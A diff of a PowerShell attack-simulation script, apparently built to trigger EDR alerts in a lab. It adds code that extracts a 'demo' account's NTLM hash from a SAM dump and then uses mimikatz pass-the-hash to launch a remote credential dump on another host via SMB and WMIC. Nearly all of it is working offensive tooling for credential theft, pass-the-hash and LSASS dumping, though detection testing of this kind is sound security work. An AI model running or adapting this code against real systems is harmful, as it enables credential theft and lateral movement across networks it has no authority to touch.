@@ -35,12 +35,21 @@ if ($missing.Count -gt 0) {
 # Hash files saved between steps (live extraction, never hardcoded)
 $clarkHashFile = "$idpDir\clark_hash.txt"
 $svcHashFile = "$idpDir\svc_runbook_hash.txt"
+$demoHashFile = "$idpDir\demo_hash.txt"
 
 function Get-ClarkHash {
     if (Test-Path $clarkHashFile) {
         return (Get-Content $clarkHashFile -First 1).Trim()
     }
     Write-Host "[!] No clark.monroe hash found. Run Step 1 first." -ForegroundColor Red
+    return $null
+}
+
+function Get-DemoHash {
+    if (Test-Path $demoHashFile) {
+        return (Get-Content $demoHashFile -First 1).Trim()
+    }
+    Write-Host "[!] No demo hash found. Run Step 1 first." -ForegroundColor Red
     return $null
 }
 
@@ -77,7 +86,7 @@ function Show-Menu {
     Write-Host
     Write-Host "  --- Phase 4: Pivot to DT (Falcon EDR triggers) ---" -ForegroundColor Yellow
     Write-Host "  5: PtH clark.monroe -> RDP to DT                 [PassTheHash + EDR: suspicious logon]"
-    Write-Host "  6: Remote dump on DT (SMB + WMIC from here)      [EDR: tool transfer, LSASS access]"
+    Write-Host "  6: Remote dump on DT (PtH demo -> SMB + WMIC)    [EDR: tool transfer, LSASS access]"
     Write-Host
     Write-Host "  --- Phase 5: Privilege Escalation + Lateral ---" -ForegroundColor Yellow
     Write-Host "  7: Kerberoast svc_runbook (via PtH context)      [Kerberoasting detection]"
@@ -149,6 +158,21 @@ do {
                     if ($manualHash -and $manualHash.Length -eq 32) {
                         $manualHash | Out-File -FilePath $clarkHashFile -Encoding ASCII
                         Write-Host "[+] Hash saved." -ForegroundColor Green
+                    }
+                }
+
+                # Auto-extract demo account NTLM hash from SAM dump
+                # SAM dump pattern: User : demo ... Hash NTLM: <hash>
+                if ($logContent -match "User\s*:\s*demo[\s\S]*?Hash NTLM\s*:\s*([0-9a-fA-F]{32})") {
+                    $extractedDemo = $Matches[1].ToLower()
+                    $extractedDemo | Out-File -FilePath $demoHashFile -Encoding ASCII
+                    Write-Host "[+] demo NTLM extracted and saved: $extractedDemo" -ForegroundColor Green
+                } else {
+                    Write-Host "[!] Could not auto-extract demo hash from dump." -ForegroundColor Yellow
+                    $manualDemoHash = Read-Host "  Enter demo account NTLM hash manually"
+                    if ($manualDemoHash -and $manualDemoHash.Length -eq 32) {
+                        $manualDemoHash | Out-File -FilePath $demoHashFile -Encoding ASCII
+                        Write-Host "[+] Demo hash saved." -ForegroundColor Green
                     }
                 }
             }
@@ -591,12 +615,12 @@ public class CryptoMD4 {
         '6' {
             Clear-Host
             Write-Host "[Step 6] Remote Credential Dump on DT" -ForegroundColor Cyan
-            Write-Host "         PtH clark.monroe -> SMB copy mimikatz -> WMIC remote exec" -ForegroundColor Gray
+            Write-Host "         PtH demo -> SMB copy mimikatz -> WMIC remote exec" -ForegroundColor Gray
             Write-Host "         Triggers: EDR lateral tool transfer, LSASS access, cred theft" -ForegroundColor Yellow
             Write-Host
 
-            $clarkHash = Get-ClarkHash
-            if (-not $clarkHash) { break }
+            $demoHash = Get-DemoHash
+            if (-not $demoHash) { break }
 
             # Write the remote dump PowerShell script to disk (avoids nested here-string)
             $scriptLines = @(
@@ -729,11 +753,11 @@ public class CryptoMD4 {
             # Batch wrapper for PtH context
             '@powershell -ExecutionPolicy Bypass -File C:\IDP_Files\remote_dump_dt.ps1' | Out-File -FilePath "$idpDir\run_remote_dump_dt.bat" -Encoding ASCII
 
-            Write-Host "  [*] Launching PtH clark.monroe -> remote dump on DT..." -ForegroundColor White
+            Write-Host "  [*] Launching PtH demo (local admin) -> remote dump on DT..." -ForegroundColor White
             Write-Host "  [*] A new window will open showing the remote dump progress." -ForegroundColor Gray
             Write-Host
 
-            & $mimiExe "privilege::debug" "sekurlsa::pth /user:clark.monroe /domain:$env:ENV_DOMAIN /ntlm:$clarkHash /run:$idpDir\run_remote_dump_dt.bat" "exit"
+            & $mimiExe "privilege::debug" "sekurlsa::pth /user:demo /domain:$env:ENV_DOMAIN /ntlm:$demoHash /run:$idpDir\run_remote_dump_dt.bat" "exit"
 
             Write-Host
             Write-Host "[+] Remote dump launched in PtH context." -ForegroundColor Green
